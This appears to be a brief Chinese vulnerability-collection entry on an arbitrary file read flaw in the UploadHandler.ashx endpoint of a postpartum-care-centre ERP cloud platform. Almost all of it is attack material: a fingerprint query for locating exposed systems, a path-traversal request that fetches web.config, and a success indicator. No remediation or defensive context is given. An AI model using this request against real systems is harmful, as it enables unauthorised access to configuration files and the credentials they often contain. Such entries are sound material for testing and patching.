# 月子会所ERP云管理平台UploadHandler.ashx存在任意文件读取漏洞

月子会所ERP云管理平台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="Page/Login/Login3.aspx"`
- **请求**：`GET /Page/upload/UploadHandler.ashx?url=../../web.config HTTP/1.1`
- **响应特征**：200